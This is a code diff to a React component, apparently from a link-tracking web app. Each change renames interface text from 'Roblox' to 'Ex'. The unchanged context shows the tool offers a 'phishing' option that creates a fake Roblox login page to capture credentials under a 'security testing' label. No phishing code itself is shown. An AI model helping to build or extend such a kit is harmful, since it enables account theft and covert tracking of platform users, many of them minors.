@@ -60,7 +60,7 @@ export default function RobloxTracking() {
       setShowForm(false);
       toast({
         title: "Success",
-        description: "Roblox tracking link created successfully!",
+        description: "Ex tracking link created successfully!",
       });
     },
     onError: (error: any) => {
@@ -80,7 +80,7 @@ export default function RobloxTracking() {
       queryClient.invalidateQueries({ queryKey: ["/api/roblox-links"] });
       toast({
         title: "Success",
-        description: "Roblox link deleted successfully!",
+        description: "Ex tracking link deleted successfully!",
       });
     },
     onError: (error: any) => {
@@ -183,7 +183,7 @@ export default function RobloxTracking() {
                   <Link2 className="h-4 w-4 text-primary" />
                 </div>
                 <div>
-                  <h2 className="text-xl sm:text-2xl font-semibold text-foreground">Roblox Tracking</h2>
+                  <h2 className="text-xl sm:text-2xl font-semibold text-foreground">Ex TRACKING</h2>
                   <p className="text-sm sm:text-base text-muted-foreground">Create tracking links for Roblox servers, profiles, and groups</p>
                 </div>
               </div>
@@ -202,7 +202,7 @@ export default function RobloxTracking() {
         {showForm && (
           <Card className="mb-6">
             <CardHeader>
-              <CardTitle>Create Roblox Tracking Link</CardTitle>
+              <CardTitle>Create Ex Tracking Link</CardTitle>
               <CardDescription>
                 {selectedLinkType === "phishing" 
                   ? "Create a fake Roblox login page to capture credentials for security testing"
@@ -369,7 +369,7 @@ export default function RobloxTracking() {
           <TabsContent value="links" className="space-y-4 mt-6">
             {isLoading ? (
               <div className="text-center py-8">
-                <div className="text-muted-foreground">Loading Roblox links...</div>
+                <div className="text-muted-foreground">Loading Ex tracking links...</div>
               </div>
             ) : robloxLinks && robloxLinks.length > 0 ? (
               robloxLinks.map((link) => (
@@ -454,7 +454,7 @@ export default function RobloxTracking() {
               <Card>
                 <CardContent className="text-center py-8">
                   <Link2 className="h-12 w-12 text-muted-foreground mx-auto mb-4" />
-                  <h3 className="text-lg font-semibold text-foreground mb-2">No Roblox Links Yet</h3>
+                  <h3 className="text-lg font-semibold text-foreground mb-2">No Ex Tracking Links Yet</h3>
                   <p className="text-muted-foreground mb-4">
                     Create your first tracking link to start monitoring Roblox traffic
                   </p>
